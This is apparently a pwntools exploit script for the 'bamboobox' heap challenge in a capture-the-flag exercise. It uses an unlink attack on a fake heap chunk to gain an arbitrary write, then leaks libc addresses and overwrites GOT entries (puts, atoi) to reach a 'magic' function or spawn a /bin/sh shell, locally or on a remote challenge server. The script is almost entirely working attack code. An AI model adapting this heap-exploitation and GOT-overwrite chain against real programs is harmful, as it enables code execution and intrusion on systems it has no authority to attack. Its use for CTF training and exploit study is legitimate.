#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
heap overflow
unlink to write anywhere
1 change GOT[puts] of magic address
2 change GOT[itoa] of system address
"""

import sys
from pwn import *

context(arch='amd64', os='linux')
# context.log_level = 'debug'

fn = './bamboobox'
elf = ELF(fn)
n = 0x100
itemlist_addr = 0x6020C0

if len(sys.argv) == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    io = process(fn)
else:
    libc = ELF('./libc_64')
    io = remote('bamboofox.cs.nctu.edu.tw', 11005)

def add(size, content):
    io.sendlineafter('choice:', '2')
    io.sendlineafter('name:\n', str(size))
    io.sendafter('item:\n', content)

def show():
    io.sendlineafter('choice:', '1')
    io.recvuntil('show_item\n')
    data = io.recvuntil('\n----------------------------', drop=True)
    return data

def change(idx, size, content):
    io.sendlineafter('choice:', '3')
    io.sendlineafter('item:\n', str(idx))
    io.sendlineafter('name:\n', str(size))
    io.sendafter('item:\n', content)

def remove(idx):
    io.sendlineafter('choice:', '4')
    io.sendlineafter('item:\n', str(idx))

def exp_unlink():
    add(n, '0' * n)
    add(n, '1' * n)
    add(n, '2' * n)
    add(n, '/bin/sh\x00'.ljust(n, '3'))
    ptr1 = itemlist_addr + 0x18
    fake_chunk = ''.join([
        p64(0),
        p64(0x101),
        p64(ptr1 - 0x18),
        p64(ptr1 - 0x10),
        'f' * (n - 0x20),
        p64(0x100),
        p64(0x110),
    ])
    change(1, n + 0x10, fake_chunk)
    remove(2)

def leak(addr):
    change(1, 0x10, p64(0x100) + p64(addr))
    data = show()
    # print(repr(data))
    n1 = len('0 : ')
    n2 = len('1 : 3 : /bin/sh')
    data = data[n1 : -n2]
    # print(repr(data))
    return data

def leak_free():
    return u64(leak(elf.got['free'])[:6].ljust(8, '\x00'))

# def leak_system():
#     d = DynELF(leak, elf=elf)
#     a = d.lookup('system', 'libc')
#     return a

def bamboobox1():
    exp_unlink()
    change(1, 0x10, p64(0x100) + p64(elf.got['puts']))
    change(0, 0x8, p64(elf.symbols['magic']))
    log.success(io.recvline(timeout=1))
    io.close()
    sys.exit(0)

def bamboobox2():
    exp_unlink()
    free_addr = leak_free()
    # system_addr = leak_system()
    system_addr = libc.symbols['system'] - libc.symbols['free'] + free_addr
    log.success('free_addr = %s', hex(free_addr))
    log.success('system_addr = %s', hex(system_addr))

    change(1, 0x10, p64(0x100) + p64(elf.got['atoi']))
    change(0, 0x8, p64(system_addr))
    io.sendafter('choice:', '/bin/sh')
    io.interactive()

if __name__ == '__main__':
    # bamboobox1()
    bamboobox2()
